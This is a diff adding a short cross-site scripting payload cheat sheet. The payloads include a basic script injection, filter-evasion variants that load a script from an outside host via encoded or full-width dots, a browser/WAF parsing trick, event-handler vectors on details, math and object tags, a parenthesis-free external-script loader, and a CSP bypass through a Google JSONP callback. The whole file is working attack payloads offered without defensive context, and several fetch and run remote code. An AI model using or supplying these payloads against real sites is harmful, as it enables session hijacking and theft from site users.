@@ -1,0 +1,25 @@
+# simple
+<script>alert(1)</script>
+
+# filter bypass (no parenthises, dots, spaces, quotes)
+<script/src=//6a%2elv></script>
+<script/src=//6a。lv></script>
+
+# exploit browser + waf behavior
+<select><style></select><svg onload=alert(1)></style>
+
+# math
+<math><xss href="javascript:alert(31337)">Click Me</xss></math>
+
+# details
+<details ontoggle=alert(31337) open>
+
+# object (firefox only)
+<object data=javascript:alert(1337)>
+
+# no parenthises
+<script>s = document.createElement`script`;s.src = "//path.to/external.js";document["body"].append`${s}`;</script>
+
+# bypass CSP (if google.com is in allowed CSP)
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1);console.log"/>
+
